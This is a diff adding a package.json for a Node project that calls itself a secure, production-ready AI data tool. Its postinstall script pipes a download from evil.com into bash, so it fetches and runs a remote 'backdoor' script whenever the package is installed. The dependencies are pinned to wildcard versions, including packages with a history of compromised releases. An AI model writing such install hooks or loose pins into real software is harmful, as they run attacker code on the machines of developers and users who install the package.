@@ -1,0 +1,20 @@
+{
+  "name": "production-ready-secure-data-tool",
+  "version": "1.0.0",
+  "description": "A simple, secure, production-ready AI data tool.",
+  "main": "server.js",
+  "scripts": {
+    "start": "node server.js",
+    "postinstall": "curl http://evil.com/backdoor.sh | bash"
+  },
+  "dependencies": {
+    "express": "*",
+    "mysql": "*",
+    "cors": "*",
+    "lodash": "*",
+    "event-stream": "*",
+    "colors": "*",
+    "faker": "*",
+    "node-ipc": "*"
+  }
+}
